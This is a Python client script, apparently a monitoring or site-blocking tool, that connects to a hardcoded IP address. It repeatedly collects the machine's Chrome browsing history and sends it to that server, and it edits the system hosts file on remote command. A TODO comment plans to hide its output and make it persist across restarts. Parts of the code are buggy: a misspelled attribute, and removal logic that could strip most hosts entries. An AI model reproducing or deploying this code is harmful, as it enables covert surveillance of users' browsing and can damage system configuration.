import socket
import os
import time
import browserhistory as bh
import platform
from datetime import datetime as dt


linux_host = '/etc/hosts'
window_host = r"C:\Windows\System32\drivers\etc\hosts"
default_folder = ""
redirect = "127.0.0.1"
computer_name = socket.gethostname()

oran = "192.168.1.28"
amal_b = "10.30.57.83"
boaz = "192.168.14.92"

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)



def operating_system():
    global default_folder
    os_name = platform.system()
    if os_name == "Linux":
        default_folder = linux_host
    elif os_name == "Windows":
        default_folder = window_host
        
        

class Client():  # TODO: ip working,make it exe,always on - turns on restart, all print() wiil be deleted
    def __init__(self, port=8810, ip=boaz):  # ip wiil change
        self.s = socket.socket()
        while True:
            try:
                self.s.connect((ip, port))
            except Exception as e:
                print("waiting to server to come up")
            else:
                break
        # [[url1,start,end],[url2.start,end]]
        self.sites_to_block = [["www.one.co.il", 0, 23], ["one.co.il", 0, 23]]
        print("connected")

    def run(self):
        self.first_message()
        while True:
            self.block_websites()
            self.limitation()
            time.sleep(0.5)
            self.history()

    def first_message(self):
        self.s.send(f"name%{computer_name}".encode())

    def history(self):
        self.s.send(f"history%{computer_name}".encode())
        bh.get_browserhistory()
        bh.write_browserhistory_csv()
        f = open("chrome_history.csv", "rb")
        print("Sending Data ....")
        l = f.read(1024)
        while (l):
            self.s.send(l)
            l = f.read(1024)
        f.close()
        print("Sending Complete")

    def limitation(self):
        self.s.settimeout(0.1)
        message = ""
        try:
            message = self.s.recv(1024).decode()
        except socket.timeout:
            pass
        else:
            request = message.split("%")
            if request[0] == "add url":
                self.sites_to_block.append(
                    [request[1], request[2], request[3]])
            elif request[0] == "remove url":
                self.site_to_block.remove([request[1], request[2], request[3]])

    def block_websites(self):
        for websites in self.sites_to_block:
            # fuck off go to work
            if dt(dt.now().year, dt.now().month, dt.now().day, websites[1]) < dt.now() < dt(dt.now().year, dt.now().month, dt.now().day, websites[2]):
                print("Do the work ....")
                with open(default_folder, 'r+') as hostfile:
                    hosts = hostfile.read()
                    if websites[0] not in hosts:
                        hostfile.write(redirect + ' ' + websites[0] + '\n')
            else:
                with open(default_folder, 'r+') as hostfile:
                    hosts = hostfile.readlines()
                    hostfile.seek(0)
                    for host in hosts:
                        if not any(site in host for site in websites[0]):
                            hostfile.write(host)
                    hostfile.truncate()
                print("Good Time...")
            time.sleep(3)


def main():
    operating_system()
    client = Client()
    client.run()


if __name__ == '__main__':
    main()
